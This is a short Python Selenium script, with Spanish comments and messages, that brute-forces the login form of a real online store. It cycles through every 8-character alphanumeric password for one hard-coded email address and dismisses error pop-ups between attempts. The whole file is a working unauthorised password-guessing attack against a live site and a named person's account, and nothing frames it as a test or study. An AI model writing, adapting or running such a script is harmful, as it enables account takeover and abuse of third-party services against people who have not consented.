from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time
import string
from itertools import product

letters = string.ascii_letters + "0123456789"
# +"ₐ₈CDₑբGₕᵢⱼₖₗₘₙₒₚQᵣₛₜᵤᵥwₓᵧZₐ♭꜀ᑯₑբ₉ₕᵢⱼₖₗₘₙₒₚ૧ᵣₛₜᵤᵥwₓᵧ₂₀₁₂₃₄₅₆₇₈₉₊₋₌₍₎"+"ا ب ك د ا ف غ ه ا ج ك ل م ن او ب ك ر س ت ا ف و كس ي ز ا ب ك د ا ف غ ه ا ج ك ل م ن او ب ك ر س ت ا ف و كس ي ز"

driver = webdriver.Chrome()

def bruteforce(usuario):
    driver.get("https://www.coolmod.com/login/")

    k = 1
    for i in product(list(letters), repeat=8):
        try:
            user = driver.find_element_by_xpath('//*[@id="inputEmail"]')
            user.clear()
            user.send_keys("basty3lol@gmail.com")
            psswrd = driver.find_element_by_xpath('//*[@id="inputPassword"]')
            psswrd.clear()

            psw = "".join(i)
            psswrd.send_keys(psw)

            click = driver.find_element_by_xpath('//*[@id="formLogin"]/div[7]/button').click()
            print("intento:", k, "password:", psw)
            if (driver.find_element_by_xpath('//*[@id="formLogin"]/div[7]/button')):
                while (True):
                    time.sleep(0.1)
                    try:
                        try:
                            driver.find_element_by_xpath('/html/body/div[4]/div/div[3]/button[1]').click()
                        except:
                            driver.find_element_by_xpath('/html/body/div[6]/div/div[3]/button[1]').click()
                        break
                    except:
                        pass
            k += 1
        except:
            print("Se encontró contraseña o hubo un error")
            break

bruteforce("basty3lol@gmial.com")